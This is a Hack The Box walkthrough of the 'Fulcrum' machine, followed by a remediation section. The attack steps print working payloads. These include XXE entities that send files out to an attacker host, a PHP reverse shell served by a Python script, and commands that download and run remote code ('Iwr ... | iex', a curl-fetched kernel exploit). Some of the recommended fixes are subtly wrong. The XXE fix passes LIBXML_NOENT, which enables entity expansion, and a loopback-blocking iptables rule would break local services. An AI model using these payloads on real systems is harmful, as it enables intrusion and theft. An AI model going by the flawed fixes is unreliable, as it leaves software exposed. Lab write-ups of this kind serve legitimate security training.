---
title: "Fulcrum HTB - Insane Linux Box Walkthrough"
date: 2025-09-22T10:00:00Z
tags: ["insane-linux", "xxe", "ssrf", "rfi", "active-directory", "winrm", "powershell", "vmware", "kernel-exploit", "privilege-escalation", "domain-admin"]
difficulty: ["insane"]
categories: ["HTB", "Linux"]
draft: false
description: "Complete walkthrough of Fulcrum HTB machine featuring blind XXE exploitation, SSRF to RFI chain, Active Directory enumeration, WinRM pivoting, PowerShell credential decryption, and kernel exploitation with VMDK file extraction"
---

# Fulcrum HTB - Insane Linux Box Walkthrough

{{< youtube 46RJxJ-Fm0Y >}}

## Key Exploitation Steps and Techniques

The following is a chronological breakdown of the key exploitation steps and techniques used to compromise the "Fulcrum" machine from Hack The Box, as described in the provided data. The steps are derived from the detailed walkthrough and organized to reflect the sequence of actions taken to achieve initial access, privilege escalation, and full compromise of the target system.

---

### 1. Initial Reconnaissance
- **Technique**: Network scanning with Nmap
- **Details**:
  - Performed an Nmap scan (`nmap -sC -sV -oA nmap/initial [TARGET-IP]`) to identify open ports and services on the target IP ([TARGET-IP]).
  - Identified services:
    - Port 80: Nginx 1.10.3 (Ubuntu), displaying a Microsoft .NET error (indicating a potential misconfiguration or rabbit hole).
    - Port 88: PHPMyAdmin (authentication attempt failed, likely locked or misconfigured).
    - Port 9001: pfSense interface (default credentials `admin:pfSense` failed due to lockout mechanism).
    - Port 9999: Unique server header "Fulcrum API beta," suggesting a custom API.
    - Confirmed the system as Ubuntu (likely Xenial 16.04) based on OpenSSH 7.2p2 banner.
  - Conducted a second Nmap scan (`nmap -p- [TARGET-IP]`) to enumerate all ports, revealing port 56423 (unidentified service).

---

### 2. Web Enumeration
- **Technique**: Manual web enumeration and file discovery
- **Details**:
  - Visited `http://[TARGET-IP]:80`, which showed an "under maintenance" page with a Microsoft .NET error (despite Nginx/Ubuntu server, indicating a misconfiguration).
  - Identified PHP files: `index.php`, `home.php`, and `upload.php` by manually testing URLs (e.g., `http://[TARGET-IP]/home.php`).
  - Attempted file upload via `upload.php`, which failed, suggesting validation checks (not an image upload vulnerability).
  - Noted the PHP application uses an include statement appending `.php` to parameters (e.g., `index.php?page=home` loads `home.php`).

---

### 3. XML External Entity (XXE) Injection (Blind)
- **Technique**: Blind XXE via API endpoint on port 9999
- **Details**:
  - Targeted the API endpoint on port 9999 (`http://[TARGET-IP]:9999`), which responded differently to XML input compared to plain text or JSON.
  - Tested for XXE by sending an XML payload to trigger an HTTP request to the attacker's server ([ATTACKER-IP]:9001):
    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [<!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "http://[ATTACKER-IP]:9001/please_subscribe"> ]>
    <foo>&xxe;</foo>
    ```
  - Confirmed XXE vulnerability when the target server made a request to the attacker's server, proving blind out-of-band interaction.
  - Used a transform file (`transform.xml`) to read files from the server:
    ```xml
    <!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
    <!ENTITY % param1 "<!ENTITY xxe SYSTEM 'http://[ATTACKER-IP]:9001/stage2.xml?%data;'>">
    ```
  - Received base64-encoded file contents (e.g., `/etc/passwd`) via HTTP requests to the attacker's server, decoded using `base64 -d`.

---

### 4. Automating XXE Exploitation
- **Technique**: Python HTTP server for dynamic XXE file retrieval
- **Details**:
  - Created a Python script (`xxe.py`) to automate file retrieval via XXE:
    - Listened on port 9001 to handle requests from the target server.
    - Handled two stages:
      - **Stage 1**: Served a transform file (`stage1.xml`) to initiate file read requests.
      - **Stage 2**: Received and decoded base64-encoded file contents from the server.
    - Script logic:
      ```python
      from http.server import BaseHTTPRequestHandler, HTTPServer
      from base64 import b64decode

      class HTTPRequestHandler(BaseHTTPRequestHandler):
          def do_GET(self):
              stage, data = self.path.split('?')
              if stage == '/stage1.xml':
                  message = """<?xml version="1.0" encoding="UTF-8"?>
                  <!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource={}">
                  <!ENTITY % param1 "<!ENTITY xxe SYSTEM 'http://[ATTACKER-IP]:9001/stage2.xml?%data;'>">
                  """.format(data)
              elif stage == '/stage2.xml':
                  message = b64decode(data).decode('utf-8')
                  print(message)
              else:
                  message = "send me shells"
              self.send_response(200)
              self.end_headers()
              self.wfile.write(bytes(message, 'utf-8'))

      server_address = ('', 9001)
      httpd = HTTPServer(server_address, HTTPRequestHandler)
      httpd.serve_forever()
      ```
  - Successfully retrieved files like `/etc/os-release` to confirm Ubuntu Xenial 16.04.

---

### 5. Server-Side Request Forgery (SSRF) to Remote File Inclusion (RFI)
- **Technique**: Chaining XXE to SSRF for RFI
- **Details**:
  - Modified the XXE payload to force the server to make requests to `http://127.0.0.1:80/index.php?page=http://[ATTACKER-IP]:9002/test`, attempting to trigger RFI.
  - Confirmed the server fetched the attacker's URL, indicating SSRF.
  - Hosted a malicious PHP reverse shell (`shell.php`) on the attacker's server ([ATTACKER-IP]:9002), based on a modified PentestMonkey PHP reverse shell.
  - Updated the Python script to serve the PHP shell when requested:
    ```python
    try:
        stage, data = self.path.split('?')
        if stage == '/stage1.xml':
            message = """<?xml version="1.0" encoding="UTF-8"?>
            <!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource={}">
            <!ENTITY % param1 "<!ENTITY xxe SYSTEM 'http://[ATTACKER-IP]:9001/stage2.xml?%data;'>">
            """.format(data)
        elif stage == '/stage2.xml':
            message = b64decode(data).decode('utf-8')
            print(message)
    except:
        message = """<?php
        // PHP reverse shell code (PentestMonkey)
        set_time_limit(0);
        $ip = '[ATTACKER-IP]';
        $port = 9002;
        $sock = fsockopen($ip, $port);
        $proc = proc_open('/bin/sh', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
        ?>"""
    self.send_response(200)
    self.end_headers()
    self.wfile.write(bytes(message, 'utf-8'))
    ```
  - Triggered the RFI by sending an XXE payload to include the malicious PHP file, resulting in a reverse shell as the `www-data` user on the Fulcrum server (`whoami: www-data`).

---

### 6. Post-Exploitation Enumeration
- **Technique**: File system and network enumeration
- **Details**:
  - Navigated the file system as `www-data`:
    - Found a PowerShell script (`fulcrum_upload_core.ps1`) in `/var/www/uploads` containing an encrypted password and decryption key.
    - Identified virtual machine (VM) infrastructure in `/var/lib/libvirt/images`, including VMDK files for a domain controller (`dc.vmdk`) and file server.
  - Ran `linpeas.sh` to enumerate system details, confirming:
    - User `blueprint` with accessible directories.
    - Multiple network interfaces (e.g., `192.168.122.1`, `192.168.122.28`) and VMs running on the hypervisor.
    - Processes indicating a virtualized environment (`libvirt`, `web`, `dc`, `file`).

---

### 7. Decrypting PowerShell Secure String
- **Technique**: PowerShell secure string decryption
- **Details**:
  - Decrypted the secure string in `fulcrum_upload_core.ps1` using PowerShell on the attacker's Kali box:
    ```powershell
    $secureString = ConvertTo-SecureString "encrypted_password" -Key (key_from_script)
    $credential = New-Object System.Management.Automation.PSCredential("web_user", $secureString)
    $password = $credential.GetNetworkCredential().Password
    ```
  - Obtained the password `management_pass` for the `web_user` account.
  - Noted PowerShell crashes due to telemetry issues, mitigated by setting `$env:POWERSHELL_TELEMETRY_OPTOUT=1`.

---

### 8. Pivoting to Windows Machine (Web Server)
- **Technique**: Windows Remote Management (WinRM) via Ruby script
- **Details**:
  - Identified WinRM service on `192.168.122.28:5986` (encrypted) using a static Nmap binary uploaded to the Fulcrum server.
  - Set up an SSH reverse tunnel to access the internal network:
    ```bash
    ssh -R 5986:192.168.122.28:5986 ifsec@[ATTACKER-IP] -N
    ```
  - Used a Ruby WinRM script (`winrm_shell.rb`) from a GitHub repository to connect to the web server:
    ```ruby
    require 'winrm'
    conn = WinRM::Connection.new(
      endpoint: 'http://127.0.0.1:5986/wsman',
      user: 'web_user',
      password: 'management_pass'
    )
    conn.shell(:powershell) do |shell|
      output = shell.run('whoami') { |stdout, stderr| puts stdout }
    end
    ```
  - Gained access to the Windows web server as `web_user`.

---

### 9. Active Directory Enumeration
- **Technique**: LDAP enumeration with PowerView
- **Details**:
  - Found credentials in `web.config` (`c:\inetpub\wwwroot\web.config`): `ldap` user with password `password_for_searching` for `fulcrum.local` domain.
  - Uploaded PowerView (`PowerView.ps1`) to the web server via WinRM file upload.
  - Created credentials for LDAP queries:
    ```powershell
    $secPass = ConvertTo-SecureString "password_for_searching" -AsPlainText -Force
    $cred = New-Object System.Management.Automation.PSCredential("fulcrum\ldap", $secPass)
    ```
  - Ran PowerView to enumerate domain users:
    ```powershell
    Import-Module .\PowerView.ps1
    Get-DomainUser -Credential $cred -DomainController dc.fulcrum.local | Select samaccountname, logoncount, lastlogon
    ```
  - Identified active accounts, including `btables` (logon count 29, password `fileserverlogin12345`) and `923a`.

---

### 10. Accessing the File Server
- **Technique**: WinRM with credentials
- **Details**:
  - Used `btables` credentials (`fulcrum\btables:fileserverlogin12345`) to access the file server (`file.fulcrum.local`):
    ```powershell
    $secPass = ConvertTo-SecureString "fileserverlogin12345" -AsPlainText -Force
    $cred = New-Object System.Management.Automation.PSCredential("fulcrum\btables", $secPass)
    Invoke-Command -ComputerName file.fulcrum.local -Credential $cred -ScriptBlock { whoami }
    ```
  - Attempted a reverse shell using a PowerShell one-liner (`invoke-conPtyShell.ps1`) on port 53 (DNS, as it was open):
    ```powershell
    Invoke-Command -ComputerName file.fulcrum.local -Credential $cred -ScriptBlock {
        Iwr http://[ATTACKER-IP]:80/invoke-conPtyShell.ps1 | iex
    }
    ```
  - Successfully obtained a shell on the file server as `btables`.

---

### 11. Enumerating File Server for Credentials
- **Technique**: Accessing Netlogon scripts
- **Details**:
  - Mounted the Netlogon share: `net use z: \\dc.fulcrum.local\netlogon /user:fulcrum\btables fileserverlogin12345`.
  - Found PowerShell scripts in the Netlogon share containing credentials.
  - Identified credentials for `923a` (password: `923a`) in a script using:
    ```powershell
    Get-ChildItem *.ps1 | Select-String "923a" | Select-Object -Unique
    ```

---

### 12. Accessing the Domain Controller
- **Technique**: Chaining Invoke-Command for double-hop
- **Details**:
  - Used `923a` credentials (`fulcrum\923a:923a`) to access the domain controller (`dc.fulcrum.local`):
    ```powershell
    $secPassBtables = ConvertTo-SecureString "fileserverlogin12345" -AsPlainText -Force
    $credBtables = New-Object System.Management.Automation.PSCredential("fulcrum\btables", $secPassBtables)
    $secPass923a = ConvertTo-SecureString "923a" -AsPlainText -Force
    $cred923a = New-Object System.Management.Automation.PSCredential("fulcrum\923a", $secPass923a)
    Invoke-Command -ComputerName file.fulcrum.local -Credential $credBtables -ScriptBlock {
        Invoke-Command -ComputerName dc.fulcrum.local -Credential $args[0] -ScriptBlock { whoami }
    } -ArgumentList $cred923a
    ```
  - Confirmed domain admin access on `dc.fulcrum.local` and located `root.txt`.

---

### 13. Unintended Privilege Escalation (Alternative Path)
- **Technique**: Kernel exploit for local privilege escalation
- **Details**:
  - Used `linpeas.sh` to identify potential kernel vulnerabilities on the Fulcrum server (Ubuntu Xenial 16.04).
  - Found and compiled an exploit (`exploit.c`) from a GitHub repository for Ubuntu 16.04 privilege escalation:
    ```bash
    curl http://[ATTACKER-IP]:80/exploit.c > exploit.c
    gcc exploit.c -o exploit
    chmod +x exploit
    ./exploit
    ```
  - Achieved root access on the Fulcrum server.
  - Mounted VMDK files to extract flags:
    ```bash
    modprobe nbd
    qemu-nbd -r -c /dev/nbd1 /var/lib/libvirt/images/dc.vmdk
    mount /dev/nbd1p1 /mnt
    ```
  - Found `root.txt` on the domain controller and `user.txt` in the `btables` directory on the file server.

---

### Summary of Key Techniques
1. **Nmap Scanning**: Identified open ports and services.
2. **Web Enumeration**: Discovered PHP files and potential vulnerabilities.
3. **Blind XXE**: Exploited API endpoint to read files and confirm vulnerabilities.
4. **Python Automation**: Streamlined XXE exploitation for file retrieval.
5. **SSRF to RFI**: Chained XXE to execute a PHP reverse shell.
6. **File System Enumeration**: Found PowerShell scripts and VM infrastructure.
7. **PowerShell Decryption**: Decrypted credentials for further access.
8. **WinRM Pivoting**: Accessed internal Windows servers via Ruby WinRM script.
9. **Active Directory Enumeration**: Used PowerView to identify active accounts and credentials.
10. **File Server Access**: Leveraged `btables` credentials for shell access.
11. **Netlogon Credential Harvesting**: Found domain admin credentials in scripts.
12. **Domain Controller Access**: Chained commands to gain domain admin access.
13. **Kernel Exploit (Unintended)**: Escalated to root and extracted flags from VMDK files.

This sequence reflects the complex, multi-stage attack path to compromise the Fulcrum machine, highlighting both the intended Active Directory exploitation chain and the unintended kernel exploit path.

## Security Gaps and Remediation

Below is a detailed analysis of the security gaps identified in the services and systems of the "Fulcrum" machine from Hack The Box, as described in the provided data. Each gap is associated with a specific service or system, and recommendations are provided for fixing these issues through source code or configuration changes. The gaps are organized by the affected service or system, with a focus on actionable fixes to prevent the exploited vulnerabilities.

---

### 1. Nginx Web Server (Port 80)
**Service**: Nginx 1.10.3 running on Ubuntu, hosting a PHP application

#### Gap 1: Server-Side Request Forgery (SSRF) via PHP Application
- **Description**: The PHP application on port 80 (`index.php`) allowed Server-Side Request Forgery (SSRF) when combined with an XXE vulnerability, enabling the server to fetch and execute remote PHP files (Remote File Inclusion, RFI).
- **Impact**: Attackers gained a reverse shell as the `www-data` user by including a malicious PHP file.
- **Fix**:
  - **Source Code Fix**:
    - Validate and sanitize the `page` parameter in `index.php` to prevent inclusion of external URLs. Use a whitelist of allowed local PHP files:
      ```php
      $allowed_pages = ['home.php', 'upload.php', 'index.php'];
      $page = $_GET['page'] ?? 'home';
      if (!in_array($page . '.php', $allowed_pages)) {
          die('Invalid page');
      }
      include $page . '.php';
      ```
    - Disable URL inclusion by setting `allow_url_include=Off` in the PHP configuration (already default in most PHP versions, but verify).
  - **Configuration Fix**:
    - Configure Nginx to restrict access to sensitive PHP files or endpoints. For example, add a location block to deny direct access to unintended PHP files:
      ```nginx
      location ~* ^/(index|home|upload)\.php$ {
          allow all;
      }
      location ~* \.php$ {
          deny all;
      }
      ```
    - Implement a Web Application Firewall (WAF) to block requests containing external URLs in query parameters.
    - Ensure `open_basedir` is set in `php.ini` to restrict PHP file access to a specific directory:
      ```ini
      open_basedir=/var/www/html
      ```

#### Gap 2: Misleading Error Message (Microsoft .NET on Ubuntu)
- **Description**: The Nginx server displayed a Microsoft .NET error message despite running on Ubuntu, indicating a misconfiguration or intentional misdirection that could confuse attackers but also signals poor configuration hygiene.
- **Impact**: While not directly exploitable, this misconfiguration could obscure legitimate debugging efforts and indicate other underlying issues.
- **Fix**:
  - **Configuration Fix**:
    - Remove or correct the misconfigured error page to reflect the actual server environment (Nginx on Ubuntu). Update the Nginx configuration to serve appropriate error pages:
      ```nginx
      error_page 500 502 503 504 /custom_error.html;
      location = /custom_error.html {
          root /var/www/html;
          internal;
      }
      ```
    - Verify that no unintended frameworks (e.g., .NET) are referenced in the application or server configuration.

---

### 2. Custom API (Port 9999)
**Service**: Custom API with "Fulcrum API beta" header

#### Gap 3: Blind XML External Entity (XXE) Injection
- **Description**: The API endpoint on port 9999 processed XML input without proper validation, allowing blind XXE attacks to read local files (e.g., `/etc/passwd`) and perform SSRF to access internal services.
- **Impact**: Attackers extracted sensitive files and chained XXE with SSRF to achieve remote code execution.
- **Fix**:
  - **Source Code Fix**:
    - Disable XML external entity processing in the API's XML parser. For PHP, if using `libxml`, explicitly disable external entities:
      ```php
      libxml_disable_entity_loader(true);
      $xml = simplexml_load_string($input, 'SimpleXMLElement', LIBXML_NOENT);
      ```
    - Use a whitelist for expected XML input formats and reject malformed or unexpected XML payloads:
      ```php
      if (!preg_match('/<heartbeat>.*<\/heartbeat>/', $input)) {
          die('Invalid XML format');
      }
      ```
    - Avoid processing user-supplied XML unless absolutely necessary; prefer JSON or other safer formats for API input.
  - **Configuration Fix**:
    - Implement a WAF to detect and block XML payloads containing `<!ENTITY` or other XXE indicators.
    - Restrict outbound network connections from the API server to prevent SSRF. Use a firewall rule to block requests to `localhost` or internal IPs:
      ```bash
      iptables -A OUTPUT -d 127.0.0.1 -j DROP
      iptables -A OUTPUT -d 192.168.0.0/16 -j DROP
      ```

---

### 3. PHPMyAdmin (Port 88)
**Service**: PHPMyAdmin instance

#### Gap 4: Exposed PHPMyAdmin with Potential Lockout Mechanism
- **Description**: PHPMyAdmin was accessible on port 88 but returned error messages even with correct credentials, suggesting a misconfiguration or lockout mechanism that could be bypassed or exploited.
- **Impact**: While not directly exploited, an exposed PHPMyAdmin instance is a high-risk target for brute-force or authentication bypass attacks.
- **Fix**:
  - **Configuration Fix**:
    - Restrict access to PHPMyAdmin by IP address in the Nginx configuration:
      ```nginx
      location /phpmyadmin {
          allow 192.168.1.0/24; # Internal admin network
          deny all;
      }
      ```
    - Enable strong authentication (e.g., HTTP Basic Auth) for PHPMyAdmin:
      ```nginx
      location /phpmyadmin {
          auth_basic "Restricted Access";
          auth_basic_user_file /etc/nginx/.htpasswd;
      }
      ```
      Generate the `.htpasswd` file:
      ```bash
      htpasswd -c /etc/nginx/.htpasswd admin
      ```
    - Ensure the lockout mechanism is properly configured with a reasonable threshold and reset period to prevent brute-force attacks without locking out legitimate users.
    - Consider removing PHPMyAdmin from public-facing servers unless absolutely necessary, or use a VPN for access.

---

### 4. pfSense Interface (Port 9001)
**Service**: pfSense administrative interface

#### Gap 5: Exposed pfSense Interface with Weak Lockout Mechanism
- **Description**: The pfSense interface was accessible on port 9001, with a lockout mechanism that prevented brute-forcing default credentials (`admin:pfSense`). However, its exposure on a public-facing port is a significant risk.
- **Impact**: Potential for brute-force attacks or exploitation of misconfigured access controls.
- **Fix**:
  - **Configuration Fix**:
    - Restrict access to the pfSense interface to specific IP addresses:
      ```text
      # In pfSense WebGUI: System > Advanced > Admin Access
      # Set "WebGUI Access" to a specific subnet (e.g., 192.168.1.0/24)
      ```
    - Disable public access to the pfSense interface by binding it to an internal interface:
      ```text
      # In pfSense WebGUI: Interfaces > Assign
      # Bind WebGUI to a management VLAN or internal interface
      ```
    - Strengthen the lockout mechanism by reducing the number of allowed login attempts and increasing the lockout duration:
      ```text
      # In pfSense WebGUI: System > User Manager > Settings
      # Set "Maximum Login Attempts" to 3 and "Lockout Time" to 3600 seconds
      ```
    - Use strong, unique passwords for pfSense admin accounts and enable two-factor authentication (2FA).

---

### 5. Ubuntu System (Fulcrum Host)
**System**: Ubuntu Xenial 16.04 (hypervisor hosting VMs)

#### Gap 6: Vulnerable Kernel (Privilege Escalation)
- **Description**: The Ubuntu Xenial 16.04 system was susceptible to a kernel exploit, allowing local privilege escalation to root.
- **Impact**: Attackers escalated from `www-data` to root, accessing sensitive VM files (`dc.vmdk`, `file.vmdk`) and extracting flags.
- **Fix**:
  - **Configuration Fix**:
    - Upgrade the kernel to a patched version. For Ubuntu 16.04, apply all security updates:
      ```bash
      sudo apt update && sudo apt full-upgrade
      ```
    - Reboot the system to ensure the updated kernel is active:
      ```bash
      sudo reboot
      ```
    - Enable automatic security updates to keep the system patched:
      ```bash
      sudo apt install unattended-upgrades
      sudo dpkg-reconfigure --priority=low unattended-upgrades
      ```
  - **Additional Hardening**:
    - Restrict access to kernel modules by non-root users:
      ```bash
      sudo chmod 700 /lib/modules
      ```
    - Implement kernel hardening with tools like `apparmor` or `selinux` to restrict unprivileged access to kernel functions.

#### Gap 7: Unrestricted Access to VMDK Files
- **Description**: The `www-data` user could access VM disk files (`/var/lib/libvirt/images/*.vmdk`), which contained sensitive data (e.g., `root.txt`, `user.txt`).
- **Impact**: Attackers mounted VMDK files to extract sensitive data without needing higher privileges.
- **Fix**:
  - **Configuration Fix**:
    - Restrict file permissions on VMDK files to the `libvirt-qemu` user and group:
      ```bash
      sudo chown libvirt-qemu:libvirt-qemu /var/lib/libvirt/images/*.vmdk
      sudo chmod 600 /var/lib/libvirt/images/*.vmdk
      ```
    - Use AppArmor or SELinux to enforce access controls on the `libvirt` directory, preventing unauthorized access by `www-data` or other users.
    - Encrypt VMDK files or use LUKS encryption for VM storage to prevent direct access to disk contents.

#### Gap 8: Weak User Permissions
- **Description**: The `www-data` user had excessive permissions, allowing execution of sensitive operations (e.g., mounting VMDK files after kernel exploit).
- **Impact**: Facilitated privilege escalation and access to sensitive system resources.
- **Fix**:
  - **Configuration Fix**:
    - Minimize `www-data` privileges by running Nginx/PHP-FPM in a restricted environment:
      ```bash
      sudo chown -R www-data:www-data /var/www/html
      sudo chmod -R 750 /var/www/html
      ```
    - Use a dedicated user for PHP-FPM with minimal permissions:
      ```text
      # In /etc/php/7.0/fpm/pool.d/www.conf
      user = php-fpm-user
      group = php-fpm-group
      ```
    - Implement a chroot jail or containerization (e.g., Docker) for the web server to isolate it from the host filesystem.

---

### 6. Windows File Server (file.fulcrum.local)
**System**: Windows server hosting file shares

#### Gap 9: Exposed Netlogon Share with Sensitive Scripts
- **Description**: The Netlogon share (`\\dc.fulcrum.local\netlogon`) contained PowerShell scripts with hardcoded credentials (e.g., `923a:923a`), accessible to domain users.
- **Impact**: Attackers extracted domain admin credentials, leading to full domain compromise.
- **Fix**:
  - **Configuration Fix**:
    - Restrict access to the Netlogon share to specific accounts (e.g., administrators only):
      ```powershell
      # On the domain controller
      $acl = Get-Acl "\\dc.fulcrum.local\netlogon"
      $acl.SetAccessRuleProtection($true, $false)
      $rule = New-Object System.Security.AccessControl.FileSystemAccessRule("Administrators", "FullControl", "Allow")
      $acl.SetAccessRule($rule)
      Set-Acl "\\dc.fulcrum.local\netlogon" $acl
      ```
    - Remove sensitive scripts from the Netlogon share or encrypt credentials using a secure vault solution (e.g., Active Directory's Group Managed Service Accounts).
  - **Source Code Fix**:
    - Avoid hardcoding credentials in scripts. Use secure credential storage (e.g., Windows Credential Manager) or environment variables accessible only to authorized processes.
    - Audit and rewrite scripts to use least-privilege accounts for operations.

#### Gap 10: Weak Passwords in Scripts
- **Description**: Scripts contained weak or predictable passwords (e.g., `923a:923a`, `fileserverlogin12345`).
- **Impact**: Facilitated credential guessing and privilege escalation.
- **Fix**:
  - **Configuration Fix**:
    - Enforce strong password policies via Group Policy:
      ```powershell
      # On the domain controller
      Set-ADDefaultDomainPasswordPolicy -Identity fulcrum.local -MinPasswordLength 14 -PasswordHistoryCount 24 -ComplexityEnabled $true
      ```
    - Regularly audit accounts for weak passwords using tools like `dsquery` or PowerView.
  - **Source Code Fix**:
    - Replace hardcoded passwords with secure credential prompts or API-based authentication mechanisms.

---

### 7. Windows Web Server (192.168.122.28)
**System**: Windows server running WinRM

#### Gap 11: Exposed WinRM Service
- **Description**: The WinRM service on port 5986 was accessible via an SSH tunnel, allowing remote code execution with valid credentials.
- **Impact**: Attackers gained a shell as `web_user` on the web server.
- **Fix**:
  - **Configuration Fix**:
    - Restrict WinRM access to specific IP ranges:
      ```powershell
      Set-Item WSMan:\localhost\Service\AllowUnencrypted $false
      Set-Item WSMan:\localhost\Service\Auth\Basic $false
      New-WSManInstance -ResourceURI winrm/config/Listener -SelectorSet @{Address="*";Transport="HTTPS"} -ValueSet @{AllowedHosts="192.168.1.0/24"}
      ```
    - Enable WinRM HTTPS with a valid certificate and disable HTTP access:
      ```powershell
      winrm quickconfig -transport:https
      ```
    - Use Group Policy to enforce WinRM authentication with Kerberos or NTLM and require strong encryption.

---

### 8. Active Directory (fulcrum.local)
**System**: Active Directory domain controller (`dc.fulcrum.local`)

#### Gap 12: Weak Domain Credentials
- **Description**: The `ldap` account had a weak password (`password_for_searching`), and the `923a` account used its username as the password (`923a:923a`).
- **Impact**: Allowed enumeration and escalation to domain admin privileges.
- **Fix**:
  - **Configuration Fix**:
    - Enforce strong password policies across the domain (as above).
    - Disable or restrict low-privilege accounts like `ldap` unless necessary, and use service accounts with limited permissions.
    - Implement account lockout policies to prevent brute-forcing:
      ```powershell
      Set-ADDefaultDomainPasswordPolicy -Identity fulcrum.local -LockoutThreshold 5 -LockoutDuration 30 -LockoutObservationWindow 30
      ```
  - **Additional Hardening**:
    - Use Privileged Access Management (PAM) solutions to manage and rotate credentials for sensitive accounts.
    - Monitor Active Directory for unusual login activity using tools like Microsoft Defender for Identity.

#### Gap 13: Excessive Permissions for Domain Users
- **Description**: Domain users (e.g., `btables`) had access to sensitive resources like the Netlogon share, and `923a` had domain admin privileges unnecessarily.
- **Impact**: Allowed escalation to domain admin via credential extraction.
- **Fix**:
  - **Configuration Fix**:
    - Audit and minimize permissions using the principle of least privilege:
      ```powershell
      # Remove unnecessary group memberships
      Remove-ADGroupMember -Identity "Domain Admins" -Members "923a" -Confirm:$false
      ```
    - Restrict Netlogon share access (as described in Gap 9).
    - Use Active Directory delegation to limit user access to specific resources.

---

### 9. PowerShell Scripts (General)
**System**: PowerShell scripts across Windows servers

#### Gap 14: Hardcoded Credentials in Scripts
- **Description**: Multiple PowerShell scripts (e.g., `fulcrum_upload_core.ps1`, Netlogon scripts) contained hardcoded credentials or secure strings with accessible decryption keys.
- **Impact**: Attackers decrypted credentials to access additional systems.
- **Fix**:
  - **Source Code Fix**:
    - Remove hardcoded credentials and use secure storage (e.g., Windows Credential Manager, Azure Key Vault):
      ```powershell
      $cred = Get-Credential -Message "Enter credentials"
      # Use $cred for authentication instead of hardcoded values
      ```
    - Encrypt sensitive data with DPAPI or secure key management:
      ```powershell
      $secureString = ConvertTo-SecureString "password" -AsPlainText -Force
      $encrypted = $secureString | ConvertFrom-SecureString
      # Store $encrypted securely, retrieve with proper access controls
      ```
  - **Configuration Fix**:
    - Restrict script execution to authorized users via PowerShell constrained language mode:
      ```powershell
      $ExecutionContext.SessionState.LanguageMode = "ConstrainedLanguage"
      ```
    - Sign scripts with a trusted certificate to prevent unauthorized modifications:
      ```powershell
      Set-AuthenticodeSignature -FilePath script.ps1 -Certificate (Get-ChildItem Cert:\CurrentUser\My -CodeSigningCert)
      ```

---

### 10. Network Configuration
**System**: Network infrastructure (Fulcrum host and internal VMs)

#### Gap 15: Unrestricted Outbound Network Access
- **Description**: The Fulcrum server allowed outbound connections to the attacker's server ([ATTACKER-IP]), enabling XXE and SSRF exploitation.
- **Impact**: Facilitated data exfiltration and remote code execution.
- **Fix**:
  - **Configuration Fix**:
    - Implement egress filtering to block outbound connections except to necessary services:
      ```bash
      iptables -A OUTPUT -p tcp --dport 80 -d <trusted_ips> -j ACCEPT
      iptables -A OUTPUT -p tcp --dport 443 -d <trusted_ips> -j ACCEPT
      iptables -A OUTPUT -j DROP
      ```
    - Use a proxy server for outbound traffic and monitor for suspicious requests.

#### Gap 16: Exposed Internal Services
- **Description**: Internal services (e.g., WinRM on 192.168.122.28:5986) were accessible via SSH tunneling from the compromised Fulcrum server.
- **Impact**: Allowed pivoting to internal Windows servers.
- **Fix**:
  - **Configuration Fix**:
    - Segment the network using VLANs or firewalls to isolate the hypervisor, web server, file server, and domain controller:
      ```text
      # In pfSense or similar firewall:
      # Create VLANs for DMZ (web server), internal servers (file, DC), and hypervisor
      # Deny traffic between VLANs unless explicitly allowed
      ```
    - Disable SSH access for the `www-data` user or restrict SSH to specific commands:
      ```bash
      # In /etc/ssh/sshd_config
      Match User www-data
          AllowTcpForwarding no
          PermitOpen none
      ```
    - Restrict WinRM to internal IPs only (as described in Gap 11).

---

### Summary of Fixes
1. **Nginx Web Server**:
   - Prevent SSRF/RFI with input validation and `open_basedir`.
   - Correct misleading error messages with proper error pages.
2. **Custom API**:
   - Disable XXE processing and restrict outbound connections.
3. **PHPMyAdmin**:
   - Restrict access by IP, enable strong authentication, and verify lockout mechanisms.
4. **pfSense**:
   - Limit access to internal IPs, strengthen lockout policies, and enable 2FA.
5. **Ubuntu System**:
   - Patch the kernel, restrict VMDK file access, and minimize `www-data` privileges.
6. **Windows File Server**:
   - Secure Netlogon share and remove hardcoded credentials.
7. **Windows Web Server**:
   - Restrict WinRM access and enforce HTTPS.
8. **Active Directory**:
   - Enforce strong passwords, limit user permissions, and monitor for suspicious activity.
9. **PowerShell Scripts**:
   - Remove hardcoded credentials, use constrained language mode, and sign scripts.
10. **Network**:
    - Implement egress filtering and network segmentation to limit internal access.

These fixes address the identified vulnerabilities through a combination of source code changes (e.g., input validation, secure credential handling) and configuration hardening (e.g., firewall rules, permission restrictions), significantly improving the security posture of the Fulcrum environment.

## Conclusion

Fulcrum is an excellent machine that demonstrates the complexity of hybrid environments mixing Linux hosts, Windows domains, and virtualized infrastructure. It requires expertise in:
- Blind XXE exploitation and automation techniques
- SSRF to RFI attack chaining for initial access
- PowerShell credential handling and decryption
- Active Directory enumeration with PowerView
- WinRM pivoting and command execution
- Network tunneling and multi-hop exploitation
- VMware VMDK file analysis and mounting
- Kernel exploitation for privilege escalation

The machine emphasizes the importance of proper input validation, secure credential storage, network segmentation, regular patching, and the principle of least privilege across both Linux and Windows environments.

---

*This walkthrough covers the complete exploitation chain for educational purposes in authorized testing environments only.*